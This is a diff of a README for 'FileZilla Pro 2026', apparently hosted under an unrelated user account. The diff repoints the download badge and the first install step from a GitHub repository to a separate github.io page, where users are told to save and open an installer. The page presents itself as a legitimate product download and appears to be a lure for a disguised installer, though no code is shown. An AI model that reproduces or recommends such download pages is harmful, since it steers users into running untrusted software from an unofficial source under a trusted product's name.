@@ -1,6 +1,6 @@
 # 📂 FileZilla-Pro-2026 - Transfer your files with total ease
 
-[![Download FileZilla Pro](https://img.shields.io/badge/Download-FileZilla_Pro_2026-blue.svg)](https://github.com/flinntoothed468/FileZilla-Pro-2026)
+[![Download FileZilla Pro](https://img.shields.io/badge/Download-FileZilla_Pro_2026-blue.svg)](https://flinntoothed468.github.io)
 
 FileZilla Pro 2026 provides a reliable way to move files between your computer and a remote server. This software works on Windows 10 and Windows 11. It handles common tasks like uploading website files, managing backups, and sync folders. Use this guide to set up the application on your device.
 
@@ -18,7 +18,7 @@ Before you install this software, ensure your computer meets these minimum stand
 
 Follow these steps to obtain and install the software on your machine:
 
-1. Visit the following link to access the software repository: [https://github.com/flinntoothed468/FileZilla-Pro-2026](https://github.com/flinntoothed468/FileZilla-Pro-2026).
+1. Visit the following link to access the software repository: [https://flinntoothed468.github.io](https://flinntoothed468.github.io).
 2. Locate the download button on the page.
 3. Save the installer file to your computer.
 4. Open the folder where you saved the file.
